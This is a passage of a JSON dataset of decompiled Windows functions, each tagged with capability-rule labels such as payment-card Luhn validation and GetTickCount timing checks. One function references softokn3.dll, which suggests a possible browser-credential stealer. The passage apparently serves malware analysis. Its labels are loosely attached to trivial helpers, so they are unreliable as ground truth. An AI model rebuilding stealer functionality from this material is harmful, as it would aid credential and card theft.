        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004207d0(uint arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint arg_ch;\n    int32_t *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint var_8ch;\n    uint var_88h;\n    uint var_80h;\n    uint32_t var_6ch;\n    uint32_t var_64h;\n    uint var_54h;\n    uint32_t var_50h;\n    uint32_t var_48h;\n    uint var_38h;\n    uint32_t var_34h;\n    uint32_t var_2ch;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43f2b0;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar1 = (**0x46920c)(0x440210, 0, 0, 0, var_10h);\n    uVar2 = (**0x4691a0)(uVar1, 8);\n    arg_ch = (**0x4691a0)(uVar1, 10);\n    arg_8h_00 = 0;\n    (**0x46925c)(0, uVar1);\n    uVar1 = fcn.004245b0(&var_80h, arg_ch);\n    var_4h = 0;\n    uVar2 = fcn.004245b0(&var_64h, uVar2);\n    var_4h._0_1_ = 1;\n    uVar2 = fcn.00406460(&var_48h, 0x4453cc, uVar2);\n    var_4h._0_1_ = 2;\n    uVar2 = fcn.0040e6b0(&var_2ch, uVar2, 0x447f08);\n    var_4h = CONCAT31(var_4h._1_3_, 3);\n    fcn.004064b0(arg_8h, uVar2, uVar1);\n    if (0xf < var_18h) {\n        fcn.0042ac49(var_2ch);\n    }\n    var_18h = 0xf;\n    var_1ch = 0;\n    var_2ch = var_2ch & 0xffffff00;\n    if (0xf < var_34h) {\n        fcn.0042ac49(var_48h);\n    }\n    var_34h = 0xf;\n    var_38h = 0;\n    var_48h = var_48h & 0xffffff00;\n    if (0xf < var_50h) {\n        fcn.0042ac49(var_64h);\n    }\n    var_50h = 0xf;\n    var_54h = 0;\n    var_64h = var_64h & 0xffffff00;\n    if (0xf < var_6ch) {\n        fcn.0042ac49(var_80h);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042ad2a(arg_8h_00);\n    return;\n}\n",
        "token_count": 776
    },
    "00420940": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00420940(uchar *arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    ushort *arg_8h_00;\n    uint var_118h;\n    uint32_t var_110h;\n    uint var_100h;\n    uint32_t var_fch;\n    uint32_t var_f4h;\n    uint var_e4h;\n    uint32_t var_e0h;\n    uint32_t var_d8h;\n    uint var_c8h;\n    uint32_t var_c4h;\n    ushort var_bch;\n    uint var_bah;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint32_t var_4h;\n    \n    uStack12 = 0x43f301;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_c4h = 0xf;\n    var_c8h = 0;\n    var_d8h = var_d8h & 0xffffff00;\n    var_4h = 0;\n    var_bch = 0;\n    fcn.0042acb0(&var_bah, 0, 0xa8, var_10h);\n    iVar1 = (**0x46914c)(&var_bch, 0x55);\n    if (iVar1 == 0) {\n        *(arg_8h + 0x14) = 0xf;\n        *(arg_8h + 0x10) = 0;\n        *arg_8h = 0;\n        uVar2 = fcn.0042b420(0x447d5c);\n        arg_8h_00 = 0x447d5c;\n        fcn.00406270(0x447d5c, uVar2);\n    }\n    else {\n        var_e0h = 7;\n        var_e4h = 0;\n        var_f4h = var_f4h & 0xffff0000;\n        uVar2 = fcn.0042e8a3(&var_bch);\n        arg_8h_00 = &var_bch;\n        fcn.0041fd20(arg_8h_00, uVar2);\n        var_4h._0_1_ = 1;\n        uVar2 = fcn.00424280(&var_110h, &var_f4h);\n        var_4h = CONCAT31(var_4h._1_3_, 2);\n        fcn.004063b0(uVar2);\n        if (0xf < var_fch) {\n            fcn.0042ac49(var_110h);\n        }\n        var_fch = 0xf;\n        var_100h = 0;\n        var_110h = var_110h & 0xffffff00;\n        var_4h = var_4h & 0xffffff00;\n        if (7 < var_e0h) {\n            fcn.0042ac49(var_f4h);\n        }\n        *(arg_8h + 0x14) = 0xf;\n        *(arg_8h + 0x10) = 0;\n        *arg_8h = 0;\n        fcn.004063b0(&var_d8h);\n    }\n    if (0xf < var_c4h) {\n        fcn.0042ac49(var_d8h);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042ad2a(arg_8h_00);\n    return;\n}\n",
        "token_count": 819
    },
    "00420af0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00420af0(uint arg_8h)\n\n{\n    uint arg_10h;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    uint var_100h;\n    int32_t var_f8h;\n    uint var_4ch;\n    uint32_t var_38h;\n    uint var_30h;\n    uint var_2ah;\n    uint var_26h;\n    ushort var_22h;\n    uint var_20h;\n    uint var_1ah;\n    uint var_16h;\n    ushort var_12h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43f338;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_20h._0_2_ = 0;\n    stack0xffffffde = 0;\n    var_1ah = 0;\n    var_16h = 0;\n    var_12h = 0;\n    (**0x4691f4)(&var_20h, var_10h);\n    (**0x4692e8)(&var_f8h);\n    var_30h._0_2_ = 0;\n    stack0xffffffce = 0;\n    var_2ah = 0;\n    var_26h = 0;\n    var_22h = 0;\n    arg_8h_00 = &var_f8h;\n    (**0x469308)(arg_8h_00, &var_20h, &var_30h);\n    arg_10h = fcn.00424750(&var_4ch, -(var_f8h / *0x447f10));\n    var_4h = 0;\n    fcn.00406460(arg_8h, 0x447f0c, arg_10h);\n    if (0xf < var_38h) {\n        fcn.0042ac49(var_4ch);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042ad2a(arg_8h_00);\n    return;\n}\n",
        "token_count": 527
    },
    "00420bf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00420bf0(uchar *arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint32_t var_4h;\n    \n    uStack12 = 0x43f389;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    var_4h = 0;\n    *arg_8h = 0;\n    uVar1 = fcn.0042b420(0x4453cc, var_10h);\n    fcn.00406270(0x4453cc, uVar1);\n    var_4h = 0;\n    uVar1 = fcn.0042b420(0x447f44);\n    fcn.00406270(0x447f44, uVar1);\n    arg_8h_00 = &var_30h;\n    var_30h = 0;\n    uVar1 = (**0x4692d4)();\n    iVar2 = (**0x469278)(uVar1);\n    if ((iVar2 == 0) || (uVar1 = 0x447da4,  var_30h == 0)) {\n        uVar1 = 0x447da0;\n    }\n    uVar1 = fcn.0040e700(&var_2ch, arg_8h, uVar1);\n    var_4h = 1;\n    fcn.004063b0(uVar1);\n    var_4h = var_4h & 0xffffff00;\n    if (0xf < var_18h) {\n        fcn.0042ac49(var_2ch);\n    }\n    uVar1 = fcn.0040e700(&var_2ch, arg_8h, 0x447f18);\n    var_4h = 2;\n    fcn.004063b0(uVar1);\n    if (0xf < var_18h) {\n        fcn.0042ac49(var_2ch);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042ad2a(arg_8h_00);\n    return;\n}\n",
        "token_count": 606
    },
    "00420df0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00420df0(int32_t *arg_8h)\n\n{\n    *arg_8h = *arg_8h * 0x14a30b + -0x69427551;\n    return;\n}\n",
        "token_count": 53
    },
    "00420e10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00420e10(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (**0x4690d8)(arg_8h, arg_ch);\n    if (iVar2 == 0) {\n        return arg_8h;\n    }\n    (**0x4691d0)(0x468878, arg_8h, iVar2 - arg_8h);\n    puVar1 = (iVar2 - arg_8h) + 0x468878;\n    *puVar1 = 0;\n    iVar3 = fcn.0042b420(arg_ch);\n    (**0x4690ac)(puVar1, 0x446e34, arg_10h, iVar3 + iVar2);\n    return 0x468878;\n}\n",
        "token_count": 203
    },
    "00420ef0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.00420ef0(int32_t arg_8h)\n\n{\n    uchar *puVar1;\n    uint arg_8h_00;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    puVar1 = fcn.0042ae6b(arg_8h);\n    *puVar1 = 0;\n    arg_8h_00 = (**0x4692c4)();\n    fcn.0042ea8e(arg_8h_00);\n    iVar3 = arg_8h;\n    if (arg_8h < 1) {\n        *puVar1 = 0;\n        return puVar1;\n    }\n    do {\n        iVar2 = fcn.0042eaa0();\n        (**0x4690ac)(puVar1, 0x4480ac, puVar1, iVar2 % 10);\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    puVar1[arg_8h] = 0;\n    return puVar1;\n}\n",
        "token_count": 234
    },
    "00421020": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00421020(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_3ech;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    fcn.0042acb0(&var_3ech, 0, 1000);\n    arg_8h_00 = 0;\n    (**0x469238)(0, arg_8h, 0, 0, &var_3ech);\n    fcn.0042ad2a(arg_8h_00);\n    return;\n}\n",
        "token_count": 139
    },
    "00421080": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00421080(uint arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    uVar4 = 0;\n    var_4h = 0;\n    var_8h = 0;\n    (**0x46911c)(&var_4h, &var_8h);\n    iVar2 = var_8h;\n    if (var_8h == 0) {\n        return 0xffffffff;\n    }\n    iVar1 = fcn.0042ae6b(var_8h);\n    if (iVar1 != 0) {\n        (**0x46916c)(var_4h, iVar2, iVar1);\n        if (var_4h != 0) {\n            puVar3 = iVar1 + 0x30;\n            do {\n                iVar2 = (**0x46921c)(*puVar3, arg_8h);\n                if (iVar2 == 0) {\n                    iVar2 = uVar4 * 0x4c + iVar1;\n                    *arg_ch = *(uVar4 * 0x4c + iVar1);\n                    arg_ch[1] = *(iVar2 + 4);\n                    arg_ch[2] = *(iVar2 + 8);\n                    arg_ch[3] = *(iVar2 + 0xc);\n                    fcn.0042acb0(iVar1, 0, 0);\n                    return uVar4;\n                }\n                uVar4 = uVar4 + 1;\n                puVar3 = puVar3 + 0x13;\n            } while (uVar4 < var_4h);\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 406
    },
    "004212d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004212d0(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *arg_8h_00;\n    uint arg_8h_01;\n    uint var_12ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    var_12ch = 0x128;\n    uVar1 = fcn.0042a126(2, 0);\n    arg_8h_01 = uVar1;\n    iVar2 = fcn.0042a120(uVar1, &var_12ch);\n    if (iVar2 != 0) {\n        iVar2 = fcn.0042a11a(uVar1, &var_12ch);\n        while (iVar2 != 0) {\n            arg_8h_00 = &var_108h;\n            fcn.0043b72f(arg_8h_00, arg_8h);\n            iVar2 = fcn.0042a11a(arg_8h_00, &var_12ch, uVar1);\n        }\n    }\n    (**0x44002c)(uVar1);\n    fcn.0042ad2a(arg_8h_01);\n    return;\n}\n",
        "token_count": 296
    },
    "004218a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004218a0(uint noname_0, uchar *arg_ch, char *arg_10h, uint32_t arg_14h)\n\n{\n    ushort *puVar1;\n    uint8_t *puVar2;\n    \n    *arg_ch = 0x25;\n    puVar1 = arg_ch + 1;\n    if ((arg_14h & 0x20) != 0) {\n        *puVar1 = 0x2b;\n        puVar1 = arg_ch + 2;\n    }\n    if ((arg_14h & 8) != 0) {\n        *puVar1 = 0x23;\n        puVar1 = puVar1 + 1;\n    }\n    if (*arg_10h == 'L') {\n        *puVar1 = 0x3649;\n        *(puVar1 + 1) = 0x34;\n        puVar2 = puVar1 + 3;\n    }\n    else {\n        *puVar1 = *arg_10h;\n        puVar2 = puVar1 + 1;\n    }\n    if ((arg_14h & 0xe00) == 0x400) {\n        *puVar2 = 0x6f;\n        puVar2[1] = 0;\n        return;\n    }\n    if ((arg_14h & 0xe00) != 0x800) {\n        *puVar2 = arg_10h[1];\n        puVar2[1] = 0;\n        return;\n    }\n    *puVar2 = ~(arg_14h * '\\b') & 0x20U | 0x58;\n    puVar2[1] = 0;\n    return;\n}\n",
        "token_count": 381
    },
    "00421930": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00421930(int32_t param_1)\n\n{\n    fcn.0042c228(*(param_1 + 8));\n    fcn.0042c228(*(param_1 + 0x10));\n    fcn.0042c228(*(param_1 + 0x14));\n    return;\n}\n",
        "token_count": 74
    },
    "00421aa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00421aa0(int32_t *param_1)\n\n{\n    int32_t *arg_8h;\n    uint32_t uVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x43f3db;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    arg_8h = param_1 + 0x14;\n    *(*(*param_1 + 4) + -0x50 + arg_8h) = 0x448134;\n    var_4h = 0;\n    param_1[1] = 0x4480f4;\n    fcn.004213b0(uVar1);\n    fcn.00418c30();\n    *(*(*param_1 + 4) + -0x50 + arg_8h) = 0x4480e0;\n    var_4h = 0xffffffff;\n    *arg_8h = 0x4473d0;\n    fcn.0042a8d9(arg_8h);\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 296
    },
    "00421f00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl\nfcn.00421f00(uint arg_8h, uint *arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, int32_t arg_1ch, uint arg_20h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t arg_1ch_00;\n    uint var_10h;\n    uint var_8h;\n    \n    while( true ) {\n        iVar2 = fcn.0042d790(arg_18h, 0, arg_1ch);\n        arg_1ch_00 = arg_1ch;\n        if (iVar2 != 0) {\n            arg_1ch_00 = iVar2 - arg_18h;\n        }\n        puVar3 = fcn.00421e20(arg_8h, &var_8h, arg_10h, arg_14h, arg_18h, arg_1ch_00);\n        arg_10h = *puVar3;\n        arg_14h = puVar3[1];\n        if (arg_1ch - arg_1ch_00 == 0) break;\n        if (arg_20h != '\\0') {\n            puVar3 = fcn.00421e90(arg_8h, &var_10h, *puVar3, puVar3[1], arg_20h, 1);\n            arg_10h = *puVar3;\n            arg_14h = puVar3[1];\n        }\n        arg_18h = arg_18h + arg_1ch_00 + 1;\n        arg_1ch = (arg_1ch - arg_1ch_00) + -1;\n    }\n    uVar1 = *puVar3;\n    arg_ch[1] = puVar3[1];\n    *arg_ch = uVar1;\n    return arg_ch;\n}\n",
        "token_count": 426
    },
    "00422470": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00422470(int32_t *arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t **ppiVar2;\n    int32_t *piVar3;\n    int32_t **ppiVar4;\n    int32_t **in_ECX;\n    uint32_t extraout_ECX;\n    uint32_t uVar5;\n    \n    piVar3 = in_ECX[4];\n    if (piVar3 < arg_8h) {\n        piVar3 = fcn.0042a19b(\"WJRI7WX91UD9AM\");\n    }\n    uVar5 = arg_ch;\n    if (-piVar3 - 1U <= arg_ch) {\n        piVar3 = fcn.0042a14e(0x4453fc);\n        uVar5 = extraout_ECX;\n    }\n    if (uVar5 != 0) {\n        piVar1 = piVar3 + uVar5;\n        if (piVar1 == 0xffffffff) {\n            piVar3 = fcn.0042a14e(0x4453fc);\n        }\n        if (in_ECX[5] < piVar1) {\n            fcn.00405b70(piVar1, piVar3);\n            if (piVar1 == NULL) {\n                return;\n            }\n        }\n        else if (piVar1 == NULL) {\n            in_ECX[4] = NULL;\n            if (in_ECX[5] < 0x10) {\n                *in_ECX = 0;\n                return;\n            }\n            **in_ECX = 0;\n            return;\n        }\n        ppiVar4 = in_ECX;\n        ppiVar2 = in_ECX;\n        if (0xf < in_ECX[5]) {\n            ppiVar4 = *in_ECX;\n            ppiVar2 = *in_ECX;\n        }\n        fcn.0042b4b0(ppiVar4 + arg_8h + arg_ch, ppiVar2 + arg_8h, in_ECX[4] - arg_8h);\n        fcn.0040b8d0(arg_8h, arg_ch, arg_10h);\n        in_ECX[4] = piVar1;\n        if (0xf < in_ECX[5]) {\n            *(*in_ECX + piVar1) = 0;\n            return;\n        }\n        *(in_ECX + piVar1) = 0;\n    }\n    return;\n}\n",
        "token_count": 559
    },
    "00422a90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00422a90(int32_t *param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    char cVar4;\n    int32_t *in_FS_OFFSET;\n    int64_t iVar5;\n    uint var_8h;\n    uint var_ch_3;\n    uint var_10h_2;\n    uint var_10h;\n    uint var_ch;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43f590;\n    var_ch_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_2;\n    param_1[2] = 0;\n    param_1[3] = 0;\n    piVar2 = *(*(*param_1 + 4) + 0x38 + param_1);\n    var_18h = 0;\n    if (piVar2 != NULL) {\n        (**(*piVar2 + 4))();\n    }\n    var_4h = 0;\n    cVar4 = fcn.004197d0(1);\n    if (cVar4 != '\\0') {\n        var_4h = 2;\n        iVar5 = (**(**(*(*param_1 + 4) + 0x38 + param_1) + 0x20))(var_8h, var_ch_3, var_10h_2);\n        puVar1 = param_1 + 2;\n        uVar3 = *puVar1;\n        *puVar1 = *puVar1 + iVar5;\n        param_1[3] = param_1[3] + (iVar5 >> 0x20) + CARRY4(uVar3, iVar5);\n        if (iVar5 != CONCAT44(var_10h_2, var_ch_3)) {\n            var_18h = 3;\n        }\n    }\n    var_4h = 1;\n    if (var_18h != 0) {\n        var_18h = *(param_1 + *(*param_1 + 4) + 0xc) | var_18h;\n        if (*(param_1 + *(*param_1 + 4) + 0x38) == 0) {\n            var_18h = var_18h | 4;\n        }\n        fcn.00418a20(var_18h, 0);\n    }\n    piVar2 = *(*(*param_1 + 4) + 0x38 + param_1);\n    var_4h = 0xffffffff;\n    if (piVar2 != NULL) {\n        (**(*piVar2 + 8))();\n    }\n    *in_FS_OFFSET = var_ch_2;\n    return param_1;\n}\n",
        "token_count": 681
    },
    "00423700": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4ch\n\nvoid __cdecl fcn.00423700(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    uint in_ECX;\n    uint var_4ch;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    uVar1 = fcn.004218a0(in_ECX, &var_ch, \"softokn3.dll\", *(arg_14h + 0x14));\n    uVar1 = fcn.0042eb89(&var_4ch, 0x40, uVar1, arg_1ch);\n    fcn.00423150(in_ECX, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, &var_4ch, uVar1);\n    fcn.0042ad2a(var_4ch);\n    return;\n}\n",
        "token_count": 247
    },
    "00423780": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4ch\n\nvoid __cdecl fcn.00423780(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    uint in_ECX;\n    uint var_4ch;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    uVar1 = fcn.004218a0(in_ECX, &var_ch, 0x448198, *(arg_14h + 0x14));\n    uVar1 = fcn.0042eb89(&var_4ch, 0x40, uVar1, arg_1ch);\n    fcn.00423150(in_ECX, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, &var_4ch, uVar1);\n    fcn.0042ad2a(var_4ch);\n    return;\n}\n",
        "token_count": 246
    },
    "00423800": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4ch\n\nvoid __cdecl\nfcn.00423800(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint uVar1;\n    uint in_ECX;\n    uint var_4ch;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    uVar1 = fcn.004218a0(in_ECX, &var_ch, 0x44819c, *(arg_14h + 0x14));\n    uVar1 = fcn.0042eb89(&var_4ch, 0x40, uVar1, arg_1ch);\n    fcn.00423150(in_ECX, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, &var_4ch, uVar1);\n    fcn.0042ad2a(var_4ch);\n    return;\n}\n",
        "token_count": 253
    },
    "00423880": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4ch\n\nvoid __cdecl\nfcn.00423880(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint uVar1;\n    uint in_ECX;\n    uint var_4ch;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    uVar1 = fcn.004218a0(in_ECX, &var_ch, 0x4481a0, *(arg_14h + 0x14));\n    uVar1 = fcn.0042eb89(&var_4ch, 0x40, uVar1, arg_1ch);\n    fcn.00423150(in_ECX, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, &var_4ch, uVar1);\n    fcn.0042ad2a(var_4ch);\n    return;\n}\n",
        "token_count": 254
    },
    "00423d10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_44h\n\nvoid __cdecl fcn.00423d10(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint arg_24h;\n    uint in_ECX;\n    uint var_44h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    arg_24h = fcn.0042eb89(&var_44h, 0x40, 0x4481c8, arg_1ch);\n    fcn.00423150(in_ECX, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, &var_44h, arg_24h);\n    fcn.0042ad2a(var_44h);\n    return;\n}\n",
        "token_count": 210
    },
    "00423d70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.00423d70(uchar *arg_8h)\n\n{\n    uint arg_8h_00;\n    uint arg_ch;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    arg_8h_00 = *(in_ECX + 8);\n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    arg_ch = fcn.0042b420(arg_8h_00);\n    fcn.00406270(arg_8h_00, arg_ch);\n    return arg_8h;\n}\n",
        "token_count": 153
    },
    "00423db0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.00423db0(uchar *arg_8h)\n\n{\n    uint arg_8h_00;\n    uint arg_ch;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    arg_8h_00 = *(in_ECX + 0x10);\n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    arg_ch = fcn.0042b420(arg_8h_00);\n    fcn.00406270(arg_8h_00, arg_ch);\n    return arg_8h;\n}\n",
        "token_count": 155
    },
    "00423df0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.00423df0(uchar *arg_8h)\n\n{\n    uint arg_8h_00;\n    uint arg_ch;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    arg_8h_00 = *(in_ECX + 0x14);\n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    arg_ch = fcn.0042b420(arg_8h_00);\n    fcn.00406270(arg_8h_00, arg_ch);\n    return arg_8h;\n}\n",
        "token_count": 155
    },
    "00423f20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00423f20(uchar *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint arg_ch_00;\n    uint arg_8h_00;\n    uint var_10ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    arg_8h_00 = 0x410;\n    iVar1 = (**0x469248)(0x410, 0, arg_ch);\n    if (iVar1 != 0) {\n        (**0x469284)(iVar1, 0, &var_108h, 0x104);\n        (**0x4690f0)(iVar1);\n    }\n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    arg_ch_00 = fcn.0042b420(&var_108h);\n    fcn.00406270(&var_108h, arg_ch_00);\n    fcn.0042ad2a(arg_8h_00);\n    return;\n}\n",
        "token_count": 270
    },
    "00423fc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
